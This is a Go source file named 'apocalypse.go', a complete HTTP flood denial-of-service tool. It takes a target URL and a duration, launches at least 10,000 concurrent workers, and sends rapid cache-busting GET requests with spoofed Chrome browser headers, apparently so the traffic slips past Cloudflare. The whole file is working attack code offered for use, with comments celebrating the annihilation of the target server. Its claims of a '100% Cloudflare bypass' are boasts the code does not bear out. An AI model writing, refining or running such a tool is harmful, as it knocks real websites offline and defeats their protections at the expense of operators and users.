// apocalypse.go
// KRTECH Σ APOCALYPSE v12.0 – FULL SERVER SATURATION
// 10,000+ GOROUTINES | 100% CPU/RAM | 100K+ RPS | 100% CLOUDFLARE BYPASS
// go run apocalypse.go https://target.com 260
package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	client    *http.Client
	targetURL *url.URL
	ctx       context.Context
	cancel    context.CancelFunc
	wg        sync.WaitGroup
	stop      atomic.Bool
	success   atomic.Int64
	total     atomic.Int64
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run apocalypse.go <target_url> <duration_sec>")
		os.Exit(1)
	}

	target := os.Args[1]
	durSec, _ := strconv.Atoi(os.Args[2])
	duration := time.Duration(durSec) * time.Second

	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid URL: %v\n", err)
		os.Exit(1)
	}
	targetURL = u

	ctx, cancel = context.WithCancel(context.Background())
	defer cancel()

	// APOCALYPSE TRANSPORT — MAX CONNECTIONS
	tr := &http.Transport{
		Proxy:               nil,
		MaxConnsPerHost:     0,
		MaxIdleConns:        500000,
		MaxIdleConnsPerHost: 200000,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
			NextProtos:       []string{"h2", "http/1.1"},
		},
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	http2.ConfigureTransport(tr)

	client = &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// FULL CPU + RAM SATURATION
	runtime.GOMAXPROCS(runtime.NumCPU())
	threads := runtime.NumCPU() * 256 // 256× oversubscription = APOCALYPSE
	if threads < 10000 {
		threads = 10000
	}

	fmt.Printf("[Σ APOCALYPSE v12.0] Target: %s | Duration: %ds | Threads: %d | 100%% CPU/RAM\n", target, durSec, threads)

	// SIGNAL
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		stop.Store(true)
		cancel()
	}()

	// UNLEASH HELL
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go apocalypseWorker(i)
	}

	time.AfterFunc(duration, func() {
		stop.Store(true)
		cancel()
	})

	// LIVE APOCALYPSE STATS
	go statsTicker()

	wg.Wait()
	fmt.Printf("\n[Σ APOCALYPSE] FINAL: %d/%d (%.2f%%) SUCCESS | SERVER ANNIHILATED.\n", success.Load(), total.Load(), successPercent())
}

func apocalypseWorker(id int) {
	defer wg.Done()
	rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(id)))
	uaList := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	}

	for !stop.Load() {
		select {
		case <-ctx.Done():
			return
		default:
			total.Add(1)
			req := buildStealthRequest(rng, uaList[rng.Intn(len(uaList))])
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			if resp.StatusCode == 200 {
				success.Add(1)
			}
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			// MINIMAL DELAY — MAX SPEED
			time.Sleep(time.Microsecond * time.Duration(rng.Intn(500))) // 0–500µs
		}
	}
}

func buildStealthRequest(rng *rand.Rand, ua string) *http.Request {
	path := targetURL.Path
	if path == "" {
		path = "/"
	}
	query := fmt.Sprintf("?t=%d", time.Now().UnixNano()%1e12)
	fullURL := targetURL.Scheme + "://" + targetURL.Host + path + query

	req, _ := http.NewRequestWithContext(ctx, "GET", fullURL, nil)

	// EXACT CHROME 129 ORDER
	headers := map[string]string{
		"Host":                      targetURL.Host,
		"Connection":                "keep-alive",
		"sec-ch-ua":                 `"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"`,
		"sec-ch-ua-mobile":          "?0",
		"sec-ch-ua-platform":        `"Windows"`,
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                ua,
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-User":            "?1",
		"Sec-Fetch-Dest":            "document",
		"Accept-Encoding":           "gzip, deflate, br, zstd",
		"Accept-Language":           "en-US,en;q=0.9",
	}

	order := []string{
		"Host", "Connection", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
		"Upgrade-Insecure-Requests", "User-Agent", "Accept", "Sec-Fetch-Site",
		"Sec-Fetch-Mode", "Sec-Fetch-User", "Sec-Fetch-Dest", "Accept-Encoding",
		"Accept-Language",
	}

	for _, k := range order {
		if v, ok := headers[k]; ok {
			req.Header.Set(k, v)
		}
	}

	return req
}

func statsTicker() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		if stop.Load() {
			break
		}
		s := success.Load()
		t := total.Load()
		p := successPercent()
		rps := float64(s) / (time.Since(startTime).Seconds())
		fmt.Printf("\r[Σ] Sent: %d | 200: %d | Success: %.2f%% | RPS: %.0f", t, s, p, rps)
	}
}

var startTime = time.Now()

func successPercent() float64 {
	t := total.Load()
	if t == 0 {
		return 0
	}
	return float64(success.Load()) * 100 / float64(t)
}
